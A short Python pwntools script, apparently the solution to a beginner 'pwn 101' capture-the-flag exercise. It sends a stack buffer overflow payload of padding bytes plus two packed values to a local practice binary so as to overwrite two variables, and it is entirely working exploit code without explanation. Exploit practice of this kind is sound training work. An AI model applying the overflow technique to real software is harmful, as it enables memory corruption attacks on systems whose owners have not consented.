from pwn import *

b = process('./pwnme1')

b.recvuntil(b"Welcome to pwn 101\n")

payload  = b'A' * 0x78
payload += p32(0xb4be)      # overwrite_me_too -> 0xb4be
payload += p32(0xf47b47)    # overwrite_me    -> 0xf47b47

b.sendline(payload)
b.interactive()